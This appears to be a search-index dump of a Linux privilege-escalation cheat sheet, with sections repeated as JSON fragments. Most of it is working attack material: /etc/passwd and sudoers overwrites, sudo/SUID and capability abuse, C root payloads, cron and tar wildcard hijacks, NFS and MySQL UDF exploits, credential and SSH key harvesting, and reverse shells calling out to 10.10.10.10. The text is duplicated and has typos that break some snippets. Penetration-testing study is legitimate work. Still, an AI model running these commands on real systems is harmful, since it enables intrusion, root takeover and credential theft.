lscpu ls / home ls / var / www / html ls / var / www / ps aux | grep root netstat -tulpn ps -aux | grep root | grep mysql ifconfig find . -type f -exec grep -i -I \"PASSWORD=\" {} / dev / null \\; locate pass | more Bash History \u00b6 history cat / home /< user >/. bash_history cat ~/. bash_history | grep -i passw OpenVPN Credentials \u00b6 locate *. ovpn Credentials in tcpdump files \u00b6 tcpdump -nt -r capture . pcap -A 2 >/ dev / null | grep -P 'pwd=' Writable Password Files \u00b6 If you have write permission to the following files: /etc/passwd /etc/shadow /etc/sudoers With /etc/passwd echo 'root2::0:0::/root:/bin/bash' >> / etc / passwd su - root2 id && whoami // Add new user to the system with GID and UID of 0 OR vi / etc / passwd Remote X ( Password Holder ) for root wg ! su root id && whoami // Remove root ' s password OR echo root :: 0 : 0 : root :/ root :/ bin / bash > / etc / passwd id && whomai OR openssl passwd - 1 -salt ignite NewRootPassword Copy output echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> / etc / passwd Replace < output > with the copied output su root2 id && whoami With /etc/shadow Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy the output vi / etc / shadow Replace root ' s hash with the output that you generated wq ! su root id && whoami With /etc/sudoers echo \"<username> ALL=(ALL:ALL) ALL\" >> / etc / sudoers // Replace \"Username\" with your current user ( Example : www-data ) sudo su id && whoami ``` # SSH Private Keys ``` ps1 find / -name authorized_keys 2 > / dev / null // Any Public Keys ? find / -name id_rsa 2 > / dev / null // Any SSH private keys ? Copy id_rsa contents of keys found with the above command Create a local file on your box and paste the content in chmod 600 < local_file > ssh -i < local_file > user @IP // Is the key password protected ? ssh2john < local_file > > hash john hash - -wordlist =/ usr / share / wordlists / rockyou . txt Kernel Expliots \u00b6 uname -a // What OS kernel are we using ? // Google Search ( Example ): 4 . 4 . 0 - 116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github // Read the expliots and follow the instructions // Popular Linux Kernel Exploits Dirty COW ( CVE - 2016 - 5195 ) URL : https :// dirtycow . ninja / Other Kernel Expliots URL : https :// github . com / SecWiki / linux-kernel-exploits Sudo -l \u00b6 Sudo -l What binaries can we execute with Sudo? Example Output User www-data may run the following commands on (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/perl (root) NOPASSWD: /usr/bin/python (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/socat (root) NOPASSWD: /usr/bin/zip (root) NOPASSWD: /usr/bin/gcc (root) NOPASSWD: /usr/bin/docker (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/MySQL (root) NOPASSWD: /usr/bin/ssh (root) NOPASSWD: /usr/bin/tmux (root) NOPASSWD: /usr/bin/pkexec (root) NOPASSWD: /usr/bin/rlwrap (root) NOPASSWD: /usr/bin/xargs (root) NOPASSWD: /usr/bin/anansi_util (root) NOPASSWD: /usr/bin/apt-get (root) NOPASSWD: /usr/bin/flask run (root) NOPASSWD: /usr/bin/apache2 (root) NOPASSWD: /usr/bin/wget Absuing Sudo binaries to gain root \u00b6 find sudo find / etc / passwd -exec / bin / bash \\; Nmap echo \"os.execute('/bin/bash/')\" > / tmp / shell . nse && sudo nmap - -script =/ tmp / shell . nse Env sudo env / bin / bash Vim sudo vim -c ':!/bin/bash' Awk sudo awk 'BEGIN {system(\"/bin/bash\")}' Perl sudo perl -e 'exec \"/bin/bash\";' Python sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' Less sudo less / etc / hosts - ! bash Man sudo man man - ! bash ftp sudo ftp - ! / bin / bash socat Attacker = socat file :` tty `, raw , echo = 0 tcp-listen : 1234 Victim = sudo socat exec : 'sh -li' , pty , stderr , setsid , sigint , sane tcp : 192 . 168 . 1 . 105 : 1234 Zip echo test > notes . txt sudo zip test . zip notes . txt -T - -unzip-command = \"sh -c /bin/bash\" gcc sudo gcc -wrapper / bin / bash , -s . Docker sudo docker run -v /:/ mnt - -rm -it alpine chroot / mnt sh MySQL sudo mysql -e '\\! /bin/sh' SSH sudo ssh -o ProxyCommand = ';sh 0<&2 1>&2' x Tmux Sudo tmux pkexec sudo pkexec / bin / bash rlwrap sudo rlwrap / bin / bash xargs sudo xargs -a / dev / null sh anansi_util sudo / home / anansi / bin / anansi_util manual / bin / bash apt-get sudo apt-get update -o APT :: Update :: Pre-Invoke ::= \u201d / bin / bash -i \u201d flask run echo 'import pty; pty.spawn(\u201c/bin/bash\u201d)' > flask . py export FLASK_APP = flask . py sudo / usr / bin / flask run apache2 Victim sudo apache2 -f / etc / shadow Copy root ' s hash Attacker echo '<root' s_hash > ' > hash john hash --wordlist=/usr/share/wordlists/rockyou.txt // Replace <root' s_hash > with the hash that you copied Back to Victim su root id && whoami Wget Victim cp / etc / passwd / tmp / passwd cat / etc / passwd Attacker Copy / etc / passwd content and put in a local file called passwd Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy output of the above command edit passwd Replace x in root ' s line with the copied output Save the file python -m SimpleHTTPServer 9000 // You can use any port Victim sudo wget http ://< attacker_ip >: 9000 / passwd -O / etc / passwd su root // Enter the new root password you generated ( Example : NewRootPassword ) id && whoami Sudo CVE \u00b6 \u1ebcploit sudo with known CVE CVE: CVE-2019-14287 CVE-2019-16634 CVE-2019-14287 \u00b6 sudo -V // Get sudo version sudo -l Vulnerable output Output = (ALL,!root) NOPASSWD: /bin/bash sudo -u #-1 /bin/bash id && whoami CVE-2019-16634 \u00b6 sudo -V // Get sudo version sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634 Download expliot.c Upload to Victim Attacker python -m SimpleHTTPServer 9000 // You can use any port Victim wget http ://< attacker_ip >: 9000 / expliot . c Compile expliot . c : gcc expliot . c -o expliot ./ expliot id && whoami Sudo LD_PRELOAD \u00b6 sudo -l Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights? Expliot cd / tmp vi priv . c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init () { unsetenv ( \"LD_PRELOAD\" ); setgid ( 0 ); setuid ( 0 ); system ( \"/bin/bash\" ); } Compile priv . c : gcc -fPIC -shared -o priv . so priv . c -nostartfiles Command : sudo LD_PRELOAD =/ tmp / priv . so awk // awk can be replaced with any sudo binary SUID / GUID Binaries Overview \u00b6 SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. Basically, you can change the permission of any file either using the \u201cNumerical\u201d method or \u201cSymbolic\u201d method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration GUID permission is similar to the SUID permission, only difference is \u2013 when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member Enumeration: find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l find / -perm -g = s -type f 2 >/ dev / null | xargs ls -l find / -perm - 4000 -type f -exec ls -la {} 2 >/ dev / null \\; find / -uid 0 -perm - 4000 -type f 2 >/ dev / null // Look for any binaries that seem odd . Any binaries running from a users home directory ? // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root SUID PATH Environmental Variable \u00b6 PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands. View PATH echo $PATH env | grep PATH print $PATH Example 1 Create a Simple Basic SUID binary cd / home / max / vi test . c #include<unistd.h> void main () { setuid ( 0 ); setgid ( 0 ); system ( \"curl -I 127.0.0.1\" ); } Compile Binary & Add SUID Bit gcc test . c -o network-tester chmod u + s network-tester mv network-tester / bin / tools / Example 1 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / network-tester ls -la / bin / tools / network-tester Test the SUID Binary / bin / tools / network-tester strings / bin / tools / network-tester Output Example : curl -I 127 . 0 . 0 . 1 Absue the SUID Binary echo \"/bin/bash\" > / tmp / curl chmod 777 / tmp / curl echo $PATH export PATH =/ tmp : $PATH / bin / tools / network-tester id && whoami Example 3 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : service apache2 status Absue the SUID Binary echo 'int mian() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' > / tmp / service . c gcc / tmp / service . c -o / tmp / service chmod 777 / tmp / service export PATH =/ tmp : $PATH echo $PATH / bin / tools / webserver-status id && whoami Example 4 (With full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : / usr / sbin / service apache2 status Absue the SUID Binary fucntion / usr / sbin / service () { cp / bin / bash / tmp && chmod + s / tmp / bash && / tmp / bash -p ; } export -f / usr / sbin / service / bin / tools / webserver-status id && whoami Example 5 (/bin/systemctl) Privilege Escalation Copy line by line inside the victim low priv shell TF =$( mktemp ). service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"chmod +s /bin/bash > /tmp/output\" [Install] WantedBy=multi-user.target' > $TF systemctl link $TF systemctl enable - -now $TF / bin / bash -p id && whoami Example 5 (Copy - /bin/cp) Privilege Escalation Victim find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Copy the contents of / etc / passwd to your local machine inside a new file called \"passwd\" Attacker Run the following command locally : openssl passwd - 1 -salt ignite NewRootPassword Copy the output Add the following inside the local passwd file echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> passwd // Replace < output > with the copied output python -m SimpleHTTPServer 9000 Victim wget -O / tmp / passwd http :// 10 . 10 . 10 . 10 : 9000 / passwd cp / tmp / passwd / etc / passwd su root2 Password : NewRootPassword id && whoami // Replace Attacker IP & Port Cron Tabs & Scheduled Tasks \u00b6 Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals Enumeration contab -l / etc / init . d / etc / cron * / etc / crontab / etc / cron . allow / etc / cron . d / etc / cron . deny / etc / cron . daily / etc / cron . hourly / etc / cron . monthly / etc / cron . weekly Example 1 Privilege Escalation via Nonexistent File Overwrite cat / etc / crontab Output Example : * * * * * root systemupdate . sh echo 'chmod +s /bin/bash' > / home / user / systemupdate . sh chmod + x / home / user / systemupdate . sh Wait a while / bin / bash -p id && whoami Example 2 Privilege Escalation via Root Executable Bash Script cat / etc / crontab Output Example : * * * * * root / usr / bin / local / network-test . sh echo \"chmod +s /bin/bash\" >> / usr / bin / local / network-test . sh Wait a while id && whomai Example 3 Privilege Escalation via Root Executable Python Script Overwrite Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import socket import subprocess import os s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.10.10.10\" , 443 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/bash\" , \"-i\" ]); // Replace the IP & Port // Save & Exit the Script Attacker nc -lvnp 443 OR Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import os os . system ( \"chmod +s /bin/bash\" ) // Save & Exit the Script Wait a While / bin / bash -p id && whoami Example 4 Privilege Escalation via Tar Bash Script (WildCards) cat / etc / crontab Output Example : * * * * * root / usr / bin / local / mysql-db-backup . sh cat / usr / bin / local / mysql-db-backup . sh Output of Script : -------------------------------- #!/bin/bash cd / var / www / html / tar czf / tmp / dbbackup . tar . gz * -------------------------------- cd / var / www / html / echo \"#!/bin/bash\" > priv . sh echo \"chmod +s /bin/bash\" >> priv . sh chmod + x priv . sh touch / var / www / html /- -checkpoint = 1 touch / var / www / html /- -checkpoint-action = exec = sh \\ priv . sh Wait a while / bin / bash -p id && whomai Example 5 Privilege Escalation via Tar Cron Job cat / etc / crontab Output Example : */ 1 * * * * root tar -zcf / var / backups / html . tgz / var / www / html /* cd / var / www / html / echo \"chmod +s /bin/bash\" > priv . sh echo \"\" > \"--checkpoint-action=exec=bash priv.sh echo \"\" > --checkpoint=1 tar cf archive.tar * // If it does not work , replace \" bash \" with \" sh \" Capabilities \u00b6 Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0). Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root. Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file. Python Perl Tar OpenSSL Python getcap -r / 2 >/ dev / null / usr / bin / python2 . 6 = cap_setuid + ep / usr / bin / python2 . 6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami OR getcap -r / 2 >/ dev / null / usr / bin / python3 = cap_setuid + ep / usr / bin / python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami Perl getcap -r / 2 >/ dev / null / usr / bin / perl = cap_setuid + ep / usr / bin / perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";' id && whoami Tar Method 1 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf shadow . tar / etc / shadow / usr / bin / tar -xvf shadow . tar cat etc / shadow Copy content of users accounts to a local file called shadow Attacker john shadow - -wordlist =/ usr / share / wordlists / rockyou . txt Crack root ' s credentials Victim su root id && whoami Method 2 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf key . tar / root /. ssh / id_rsa / usr / bin / tar -xvf key . tar cat id_rsa # Download id_rsa to attacker machine Attacker chmod 600 id_rsa ssh -i id_rsa root @< victim_ip > id && whoami OpenSSL Victim getcap -r / 2 >/ dev / null / usr / bin / openssl = cap_setuid + ep Attacker Create a .so file - Code below vi priv.c #include <openssl/engine.h> #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> static const char * engine_id = \"test\" ; static const char * engine_name = \"hope it works\" ; static int bind ( ENGINE * e , const char * id ) { int ret = 0 ; if (! ENGINE_set_id ( e , engine_id )) { fprintf ( stderr , \"ENGINE_set_id failed\\n\" ); goto end ; } if (! ENGINE_set_name ( e , engine_name )) { printf ( \"ENGINE_set_name failed\\n\" ); goto end ; } setuid ( 0 ); setgid ( 0 ); system ( \"chmod +s /bin/bash\" ); system ( \"echo Complete!\" ); ret = 1 ; end : return ret ; } IMPLEMENT_DYNAMIC_BIND_FN ( bind ) IMPLEMENT_DYNAMIC_CHECK_FN () Compile Code & Create .so file gcc -c fPIC priv . c -o priv gcc -shared -o priv . so -lcrypto priv Victim Download .so from Attacker wget -O / tmp / priv . so http :// 10 . 10 . 10 . 10 : 9000 / priv . so // Replace IP & Port Get Root openssl req -engine /tmp/priv.so /bin/bash -p id && whoami NFS Root Squashing \u00b6 Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network. rw: Permit clients to read as well as write access to the shared directory. ro: Permit clients to Read-only access to shared directory. root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account. no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication. async: It will speed up transfers but can cause data corruption as NFS server doesn\u2019t wait for the complete write operation to be finished on the stable storage, before replying to the client. sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage. Enumeration Victim cat / etc / exports // Do we see any no_root_squash enabled on a mounted share ? / tmp *( rw , sync , insecure , no_root_squash , no , subtree , check ) Attacker nmap -sV - -script = nfs-showmount < victim_ip > Privilege Escalation Attacker showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > / tmp / mount / priv . c gcc / tmp / mount / priv . c -o / tmp / mount / priv chmod + s / tmp / mount / priv OR showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount cd / tmp / mount cp / bin / bash . chmod + s bash Victim cd / tmp ./ priv id && whoami OR cd / tmp ./ bash -p id && whoami chkrootkit 0.49 \u00b6 Expliot: https://www.exploit-db.com/exploits/33899 cat /etc/cron.daily /usr/bin/chkrootkit ls -la /usr/bin/chkrootkit // Do we have SUID? chkrootkit -V echo \"#!/bin/bash\" > /tmp/update echo \"chmod +s /bin/bash\" >> /tmp/update Wait a While ... /bin/bash -p id && whoami Tmux \u00b6 tmux is a terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. Tmux Cheat Sheet: https://tmuxcheatsheet.com/ Privilege Escalation tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /tmp/tmux-14/default-root // Replace Path to Socket (Depending on your results) OR tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /opt/.dev/gbm/ attach -t 0 // Replace Path to Session (Depending on your results) MySQL Running as root \u00b6 Example 1 ps aux | grep root mysql -u root -p \\! chmod + s / bin / bash exit ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 2 Victim ps aux | grep root mysql -u root -p \\! bash -i >& / dev / tcp / 10 . 10 . 10 . 10 / 9999 0 >& 1 Attacker nc -lvnp 9999 id && whoami MySQL UDF (User-Defined Functions) Code (UDF) Injection \u00b6 User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat() UDFs are useful when you need to extend the functionality of your MySQL server For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution Example 1 - Reverse Shell Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1' ); // Any UDF library can be used , as long as it is exploitable via the sys_exec () function // The \"admin\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port Attacker nc -lvnp 9999 Example 2 (Local via SUID) Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'chmod +s /bin/bash' ); mysql > exit Wait a while ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 3 (Explioting MySQL 4.x/5.0 (Linux)) UDF Link: https://www.exploit-db.com/exploits/1518 Victim wget -O priv . c https :// www . exploit-db . com / download / 1518 gcc \u2013 g \u2013 shared \u2013 Wl , \u2013 soname , priv . so \u2013 o priv . so priv . c \u2013 lc chmod 777 priv . so mv priv . so / tmp / mysql -u root -p mysql > create table priv ( line blob ); mysql > insert into priv values ( load_file ( \u2018 / tmp / priv . so \u2019 )); mysql > select * from priv into dumpfile \u2018 / usr / lib / mysql / plugin / priv . so \u2019 ; mysql > create function do_system returns integer soname \u2018 priv . so \u2019 ; mysql > select do_system ( \u2018 chmod + s / bin / bash \u2019 ); mysql >! sh / bin / bash -p id && whoami // priv . c can be called anything // The \"priv\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port","title":"Linux Privilege Escalation"},{"location":"notes/privilege-escalation/linux/#linux-privilege-escalation","text":"https://gtfobins.github.io/ https://grimbins.github.io/","title":"Linux Privilege Escalation"},{"location":"notes/privilege-escalation/linux/#privilege-escalation-methods","text":"Basic System Enumeration Bash History OpenVPN Credentials Credentials in tcpdump files Writable Files SSH Private Keys Kernel Expliots Sudo -l Sudo CVE Sudo LD_PRELOAD SUID / GUID Binaries SUID PATH Environmental Variable Cron Tabs & Scheduled Tasks Capabilities (Python - Perl - Tar - OpenSSL) NFS Root Squashing chkrootkit 0.49 Tmux (Attach Session) Screen (Attach Session) MySQL Running as root MySQL UDF (User-Defined Functions) Code (UDF) Injection","title":"Privilege Escalation Methods"},{"location":"notes/privilege-escalation/linux/#basic-system-enumeration","text":"uname -a hostname lscpu ls / home ls / var / www / html ls / var / www / ps aux | grep root netstat -tulpn ps -aux | grep root | grep mysql ifconfig find . -type f -exec grep -i -I \"PASSWORD=\" {} / dev / null \\; locate pass | more","title":"Basic System Enumeration"},{"location":"notes/privilege-escalation/linux/#bash-history","text":"history cat / home /< user >/. bash_history cat ~/. bash_history | grep -i passw","title":"Bash History"},{"location":"notes/privilege-escalation/linux/#openvpn-credentials","text":"locate *. ovpn","title":"OpenVPN Credentials"},{"location":"notes/privilege-escalation/linux/#credentials-in-tcpdump-files","text":"tcpdump -nt -r capture . pcap -A 2 >/ dev / null | grep -P 'pwd='","title":"Credentials in tcpdump files"},{"location":"notes/privilege-escalation/linux/#writable-password-files","text":"If you have write permission to the following files: /etc/passwd /etc/shadow /etc/sudoers With /etc/passwd echo 'root2::0:0::/root:/bin/bash' >> / etc / passwd su - root2 id && whoami // Add new user to the system with GID and UID of 0 OR vi / etc / passwd Remote X ( Password Holder ) for root wg ! su root id && whoami // Remove root ' s password OR echo root :: 0 : 0 : root :/ root :/ bin / bash > / etc / passwd id && whomai OR openssl passwd - 1 -salt ignite NewRootPassword Copy output echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> / etc / passwd Replace < output > with the copied output su root2 id && whoami With /etc/shadow Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy the output vi / etc / shadow Replace root ' s hash with the output that you generated wq ! su root id && whoami With /etc/sudoers echo \"<username> ALL=(ALL:ALL) ALL\" >> / etc / sudoers // Replace \"Username\" with your current user ( Example : www-data ) sudo su id && whoami ``` # SSH Private Keys ``` ps1 find / -name authorized_keys 2 > / dev / null // Any Public Keys ? find / -name id_rsa 2 > / dev / null // Any SSH private keys ? Copy id_rsa contents of keys found with the above command Create a local file on your box and paste the content in chmod 600 < local_file > ssh -i < local_file > user @IP // Is the key password protected ? ssh2john < local_file > > hash john hash - -wordlist =/ usr / share / wordlists / rockyou . txt","title":"Writable Password Files"},{"location":"notes/privilege-escalation/linux/#kernel-expliots","text":"uname -a // What OS kernel are we using ? // Google Search ( Example ): 4 . 4 . 0 - 116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github // Read the expliots and follow the instructions // Popular Linux Kernel Exploits Dirty COW ( CVE - 2016 - 5195 ) URL : https :// dirtycow . ninja / Other Kernel Expliots URL : https :// github . com / SecWiki / linux-kernel-exploits","title":"Kernel Expliots"},{"location":"notes/privilege-escalation/linux/#sudo-l","text":"Sudo -l What binaries can we execute with Sudo? Example Output User www-data may run the following commands on (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/perl (root) NOPASSWD: /usr/bin/python (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/socat (root) NOPASSWD: /usr/bin/zip (root) NOPASSWD: /usr/bin/gcc (root) NOPASSWD: /usr/bin/docker (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/MySQL (root) NOPASSWD: /usr/bin/ssh (root) NOPASSWD: /usr/bin/tmux (root) NOPASSWD: /usr/bin/pkexec (root) NOPASSWD: /usr/bin/rlwrap (root) NOPASSWD: /usr/bin/xargs (root) NOPASSWD: /usr/bin/anansi_util (root) NOPASSWD: /usr/bin/apt-get (root) NOPASSWD: /usr/bin/flask run (root) NOPASSWD: /usr/bin/apache2 (root) NOPASSWD: /usr/bin/wget","title":"Sudo -l"},{"location":"notes/privilege-escalation/linux/#absuing-sudo-binaries-to-gain-root","text":"find sudo find / etc / passwd -exec / bin / bash \\; Nmap echo \"os.execute('/bin/bash/')\" > / tmp / shell . nse && sudo nmap - -script =/ tmp / shell . nse Env sudo env / bin / bash Vim sudo vim -c ':!/bin/bash' Awk sudo awk 'BEGIN {system(\"/bin/bash\")}' Perl sudo perl -e 'exec \"/bin/bash\";' Python sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' Less sudo less / etc / hosts - ! bash Man sudo man man - ! bash ftp sudo ftp - ! / bin / bash socat Attacker = socat file :` tty `, raw , echo = 0 tcp-listen : 1234 Victim = sudo socat exec : 'sh -li' , pty , stderr , setsid , sigint , sane tcp : 192 . 168 . 1 . 105 : 1234 Zip echo test > notes . txt sudo zip test . zip notes . txt -T - -unzip-command = \"sh -c /bin/bash\" gcc sudo gcc -wrapper / bin / bash , -s . Docker sudo docker run -v /:/ mnt - -rm -it alpine chroot / mnt sh MySQL sudo mysql -e '\\! /bin/sh' SSH sudo ssh -o ProxyCommand = ';sh 0<&2 1>&2' x Tmux Sudo tmux pkexec sudo pkexec / bin / bash rlwrap sudo rlwrap / bin / bash xargs sudo xargs -a / dev / null sh anansi_util sudo / home / anansi / bin / anansi_util manual / bin / bash apt-get sudo apt-get update -o APT :: Update :: Pre-Invoke ::= \u201d / bin / bash -i \u201d flask run echo 'import pty; pty.spawn(\u201c/bin/bash\u201d)' > flask . py export FLASK_APP = flask . py sudo / usr / bin / flask run apache2 Victim sudo apache2 -f / etc / shadow Copy root ' s hash Attacker echo '<root' s_hash > ' > hash john hash --wordlist=/usr/share/wordlists/rockyou.txt // Replace <root' s_hash > with the hash that you copied Back to Victim su root id && whoami Wget Victim cp / etc / passwd / tmp / passwd cat / etc / passwd Attacker Copy / etc / passwd content and put in a local file called passwd Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy output of the above command edit passwd Replace x in root ' s line with the copied output Save the file python -m SimpleHTTPServer 9000 // You can use any port Victim sudo wget http ://< attacker_ip >: 9000 / passwd -O / etc / passwd su root // Enter the new root password you generated ( Example : NewRootPassword ) id && whoami","title":"Absuing Sudo binaries to gain root"},{"location":"notes/privilege-escalation/linux/#sudo-cve","text":"\u1ebcploit sudo with known CVE CVE: CVE-2019-14287 CVE-2019-16634","title":"Sudo CVE"},{"location":"notes/privilege-escalation/linux/#cve-2019-14287","text":"sudo -V // Get sudo version sudo -l Vulnerable output Output = (ALL,!root) NOPASSWD: /bin/bash sudo -u #-1 /bin/bash id && whoami","title":"CVE-2019-14287"},{"location":"notes/privilege-escalation/linux/#cve-2019-16634","text":"sudo -V // Get sudo version sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634 Download expliot.c Upload to Victim Attacker python -m SimpleHTTPServer 9000 // You can use any port Victim wget http ://< attacker_ip >: 9000 / expliot . c Compile expliot . c : gcc expliot . c -o expliot ./ expliot id && whoami","title":"CVE-2019-16634"},{"location":"notes/privilege-escalation/linux/#sudo-ld_preload","text":"sudo -l Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights? Expliot cd / tmp vi priv . c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init () { unsetenv ( \"LD_PRELOAD\" ); setgid ( 0 ); setuid ( 0 ); system ( \"/bin/bash\" ); } Compile priv . c : gcc -fPIC -shared -o priv . so priv . c -nostartfiles Command : sudo LD_PRELOAD =/ tmp / priv . so awk // awk can be replaced with any sudo binary","title":"Sudo LD_PRELOAD"},{"location":"notes/privilege-escalation/linux/#suid-guid-binaries-overview","text":"SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. Basically, you can change the permission of any file either using the 